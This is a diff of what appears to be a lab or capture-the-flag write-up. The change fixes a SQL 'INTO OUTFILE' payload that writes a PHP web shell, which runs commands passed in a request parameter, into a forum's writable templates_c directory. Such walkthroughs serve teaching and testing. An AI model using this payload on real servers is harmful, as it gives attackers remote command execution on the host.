@@ -166,10 +166,7 @@ GENERATED WORDS: 4612
 Every one of them are protected except for **templates_c**: 
 
 ```bash
-SELECT "<form action='/forum/templates_c/hackedyou.php' method='GET'>Hacked you:
-<input type='text' name='hackedyou'>
-<input type=submit value='exe command'<br><br>
-<?php system($_REQUEST['hackedyou'];?>" INTO OUTFILE "/var/www/forum/templates_c/hackedyou.php"
+SELECT "<form action='/forum/templates_c/hackedyou.php' method='GET'>Hacked you:<input type='text' name='hackedyou'><input type=submit value='exe command'<br><br><?php system($_REQUEST['hackedyou']); ?>" INTO OUTFILE "/var/www/forum/templates_c/hackedyou.php"
 ```
 
 <br>![](./img/sql-success.png)
